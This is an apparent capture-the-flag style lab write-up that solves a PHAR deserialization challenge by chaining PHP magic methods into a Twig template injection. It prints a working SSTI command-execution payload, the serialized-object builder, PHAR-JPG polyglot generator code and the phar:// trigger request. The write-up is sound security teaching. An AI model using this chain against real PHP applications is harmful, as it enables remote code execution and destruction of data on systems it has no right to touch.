# Using PHAR Deserialization to Deploy a Custom Gadget Chain

**Difficulty:** Expert

**Category:** Insecure Deserialization / PHP Deserialization / PHAR

**Status:** Solved ✅



## Overview



This lab demonstrates how **PHAR deserialization** can be combined with a custom PHP gadget chain and a Twig SSTI payload to achieve 
command execution.



The final objective was to delete:



```text

/home/carlos/morale.txt

```



The complete gadget chain was:



```text

PHAR metadata

    ↓

unserialize()

    ↓

CustomTemplate

    ↓

lockFilePath()

    ↓

Blog::__toString()

    ↓

Twig SSTI

    ↓

exec()

    ↓

rm /home/carlos/morale.txt

```



---



## 1. Finding the Source Code



The application loads user avatars through:



```http


GET /cgi-bin/avatar.php?avatar=wiener.jpg

```



The `/cgi-bin` directory revealed:



```text

Blog.php

CustomTemplate.php


```



Using the backup suffix:



```http

GET /cgi-bin/Blog.php~

GET /cgi-bin/CustomTemplate.php~

```



we could retrieve the PHP source code.



---



## 2. CustomTemplate.php



The important parts were:



```php

class CustomTemplate {

    private $template_file_path;



    public function __construct($template_file_path) {

        $this->template_file_path = $template_file_path;

    }


    private function isTemplateLocked() {

        return file_exists($this->lockFilePath());

    }



    public function getTemplate() {

        return file_get_contents($this->template_file_path);
    }



    public function saveTemplate($template) {

        if (!isTemplateLocked()) {

            if (file_put_contents($this->lockFilePath(), "") === false) {

                throw new Exception("Could not write to " . $this->lockFilePath());

            }



            if (file_put_contents($this->template_file_path, $template) === false) {

                throw new Exception("Could not write to " . $this->template_file_path);

            }

        }

    }



    function __destruct() {

        @unlink($this->lockFilePath());

    }


    private function lockFilePath()

    {

        return 'templates/' . $this->template_file_path . '.lock';

    }

}

```



The interesting sink is:




```php

return 'templates/' . $this->template_file_path . '.lock';

```



If `$template_file_path` contains an object, PHP attempts to convert that object to a string.



This can invoke:



```php

Blog::__toString()

```


---



## 3. Blog.php



The relevant source was:



```php

class Blog {

    public $user;

    public $desc;

    private $twig;



    public function __construct($user, $desc) {

        $this->user = $user;

        $this->desc = $desc;

    }




    public function __toString() {


        return $this->twig->render('index', ['user' => $this->user]);

    }



    public function __wakeup() {

        $loader = new Twig_Loader_Array([



            'index' => $this->desc,

        ]);


        $this->twig = new Twig_Environment($loader);

    }




    public function __sleep() {

        return ["user", "desc"];
    }

}

```


There are two important magic methods:



```php

__wakeup()

__toString()

```



---



## 4. Building the Gadget Chain



We want:



```text

CustomTemplate::$template_file_path

                ↓

              Blog

```




When `CustomTemplate::lockFilePath()` concatenates the object with a string:

```php

'templates/' . $this->template_file_path

```



PHP invokes:



```php

Blog::__toString()

```



The `Blog` object contains our malicious Twig template in:



```php

$blog->desc

```



During deserialization, `Blog::__wakeup()` initializes the Twig environment using this value.



---



## 5. Twig SSTI Payload



The payload used in the lab was:



```twig

{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("rm /home/carlos/morale.txt")}}

```



The first expression registers:



```text

exec

```



as the callback for an undefined Twig filter.



The second expression causes the callback to be invoked with:



```bash

rm /home/carlos/morale.txt

```



This provides the command execution primitive.



---



## 6. Creating the Malicious Objects



A critical detail is that `CustomTemplate::$template_file_path` is a **private property** in the target application.



The initial simplified class definition produced:



```text

s:18:"template_file_path";

```



which represented a public property.



That would not correctly populate the target's private property.



Instead, the builder used a class definition containing the private property:



```php

class CustomTemplate {

    private $template_file_path;



    public function __construct($template_file_path) {

        $this->template_file_path = $template_file_path;

    }

}



class Blog {

    public $user;

    public $desc;

}



$blog = new Blog;



$blog->desc = '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("rm /home/carlos/morale.txt")}}';


$blog->user = 'user';



$object = new CustomTemplate($blog);

```



This causes PHP to serialize the private property using the class-scoped property representation.



---



## 7. PHAR-JPG Polyglot


A PHAR-JPG polyglot was used to make the malicious PHAR payload available through the avatar upload functionality.




The builder used:



```php

function generate_base_phar($o, $prefix){

    global $tempname;



    @unlink($tempname);



    $phar = new Phar($tempname);



    $phar->startBuffering();



    $phar->addFromString("test.txt", "test");


    $phar->setStub("$prefix<?php __HALT_COMPILER(); ?>");



    $phar->setMetadata($o);


    $phar->stopBuffering();



    $basecontent = file_get_contents($tempname);




    @unlink($tempname);



    return $basecontent;
}
```



The polyglot generation function was:



```php

function generate_polyglot($phar, $jpeg){

    $phar = substr($phar, 6);



    $len = strlen($phar) + 2;



    $new = substr($jpeg, 0, 2)

        . "\xff\xfe"

        . chr(($len >> 8) & 0xff)

        . chr($len & 0xff)

        . $phar

        . substr($jpeg, 2);



    $contents = substr($new, 0, 148)

        . "        "

        . substr($new, 156);



    $chksum = 0;



    for ($i=0; $i<512; $i++){

        $chksum += ord(substr($contents, $i, 1));

    }


    $oct = sprintf("%07o", $chksum);



    $contents = substr($contents, 0, 148)
        . $oct

        . substr($contents, 155);




    return $contents;

}

```




The payload was then written to:


```text

out.jpg


```



---


## 8. Generating the Polyglot



The builder configuration was:



```php

$tempname = 'temp.tar.phar';




$jpeg = file_get_contents('in.jpg');



$outfile = 'out.jpg';



$payload = $object;


$prefix = '';



file_put_contents(

    $outfile,

    generate_polyglot(

        generate_base_phar($payload, $prefix),

        $jpeg

    )

);

```

The payload was generated with:



```bash

php -c php.ini phar_jpg_polyglot.php

```





We then checked the output:



```bash

file out.jpg

ls -lh out.jpg

```



The result was:



```text

out.jpg: POSIX tar archive

```


This was expected for the PHAR/TAR-based polyglot builder we used.



---




## 9. Uploading the Payload


The generated file:



```text



out.jpg

```


was uploaded as the `wiener` user's avatar.




---



## 10. Triggering PHAR Deserialization




The avatar endpoint appends `.jpg` to the supplied avatar name.




Therefore, instead of directly supplying:



```text

phar://wiener.jpg

```



the request was:




```http

GET /cgi-bin/avatar.php?avatar=phar://wiener

```



The application effectively resolved this as:



```text

phar://wiener.jpg

```



which points to the uploaded PHAR/JPG polyglot.



---



## 11. Final Exploitation Flow



The complete flow was:



```text
Upload out.jpg

       ↓
avatar.php

       ↓

phar://wiener

       ↓

PHAR metadata

       ↓

unserialize()

       ↓


CustomTemplate

       ↓

$template_file_path → Blog object

       ↓

lockFilePath()
       ↓

Blog::__toString()

       ↓

Twig render()

       ↓

Twig SSTI payload


       ↓

exec()

       ↓

rm /home/carlos/morale.txt

```



The lab was successfully solved.


---



## Final Payload



```twig

{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("rm /home/carlos/morale.txt")}}
```



## Final Trigger



```http

GET /cgi-bin/avatar.php?avatar=phar://wiener

```



## Key Takeaways


* PHAR metadata can be an entry point for PHP deserialization.

* PHP magic methods can be chained into a custom gadget chain.

* `__toString()` can be triggered implicitly during object-to-string conversion.

* `__wakeup()` can initialize attacker-controlled state during deserialization.

* Property visibility matters when crafting serialized PHP objects.


* A PHAR can be embedded into a polyglot file to bypass an image-upload context.

* The final command execution came from a Twig SSTI primitive inside the deserialized `Blog` object.


**Lab Status: Solved ✅**
